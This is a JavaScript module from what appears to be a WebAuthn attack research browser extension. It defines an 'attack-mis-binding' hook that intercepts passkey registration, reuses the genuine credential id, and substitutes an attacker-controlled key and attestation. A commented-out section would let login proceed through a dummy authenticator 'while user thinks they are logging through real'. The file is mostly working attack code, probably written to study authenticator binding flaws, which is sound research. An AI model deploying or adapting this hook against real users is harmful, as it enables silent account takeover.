import { AttackHook } from '../attacks/attack_hook';
import { getLogger } from '../logging';
import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils';
import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';

const log = getLogger('background');

export class AttackHookMisBinding extends AttackHook {
    getName() {
        return 'attack-mis-binding';
    }

    /**
     * Handles the creation of a new WebAuthn credential in response to a message.
     *
     * Parses the original credential and options from the incoming message, generates a new registration key and attestation,
     * and returns the credential in a response message. Handles and logs errors appropriately.
     *
     * @async
     * @param {WebAuthnRequestMessage} msg - The message containing the credential creation request and options.
     * @param {chrome.runtime.MessageSender} sender - The sender of the message, used to extract the origin.
     * @returns {Promise<WebAuthnResponseMessage | WebAuthnErrorMessage>} A promise that resolves to either a successful response message with the credential or an error message.
     */
    async onCredentialCreate(msg, sender) {
        const origin = getOriginFromUrl(sender.url);

        const originalCredential = webauthnParse(msg.originalCredential);

        const id = originalCredential.id;
        const rawId = Array.from(new Uint8Array(originalCredential.rawId));

        try {
            const opts = webauthnParse(msg.options);
            log.debug(msg);
            const credential = await generateRegistrationKeyAndAttestation(
                origin,
                opts.publicKey,
                '9999',
                id,
                rawId,
            );

            log.debug('create credential');
            log.debug(credential);
            log.debug(webauthnStringify(credential));
            log.debug('RE PARSE ', webauthnParse(webauthnStringify(credential)));
            return {
                credential: webauthnStringify(credential),
                requestID: msg.requestID,
                type: 'create_response',
            };
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                log.error('failed to import key due to DOMException', { code, message, name }, e);
            } else {
                log.error('failed to import key', { errorType: `${(typeof e)}` }, e);
            }

            return {
                requestID: msg.requestID,
                type: 'error',
                exception: e.toString()
            };
        }
    }

    /**
     * Handles a WebAuthn credential get (sign) request.
     *
     * @async
     * @param {WebAuthnRequestMessage} msg - The message containing the credential get request details.
     * @param {chrome.runtime.MessageSender} sender - The sender of the message, including tab and URL information.
     * @returns {Promise<WebAuthnResponseMessage | WebAuthnErrorMessage>} A promise that resolves to either a sign response message or an error message.
     */
    async onCredentialGet(msg, sender) {

        return {
            type: 'sign_response',
            requestID: msg.requestID,
            credential: msg.originalCredential,
        }

        //  Uncooment the following to allow login using the dummy authenticator while user thinks they are logging through real.
        // const origin = getOriginFromUrl(sender.url);
        // const opts = webauthnParse(msg.options);

        // log.debug(opts);
        // // const pin = await requestPin(sender.tab.id, origin);
        // log.debug('Origin in background sign function', origin);

        // try {
        //     const credential = await generateKeyRequestAndAttestation(origin, opts.publicKey, `9999`);
        //     const authenticatedResponseData = {
        //         credential: webauthnStringify(credential),
        //         requestID: msg.requestID,
        //         type: 'sign_response',
        //     };
        //     log.debug(msg);
        //     log.debug('auth credential');
        //     log.debug(credential);
        //     log.debug(webauthnStringify(credential));
        //     return authenticatedResponseData;
        // } catch (e) {
        //     if (e instanceof DOMException) {
        //         const { code, message, name } = e;
        //         log.error('failed to sign due DOMException', { code, message, name }, e);
        //     } else {
        //         log.error('failed to sign', { errorType: `${(typeof e)}` }, e);
        //     }

        //     return {
        //         requestID: msg.requestID,
        //         type: 'error',
        //         exception: e.toString()
        //     };
        // }
    }
}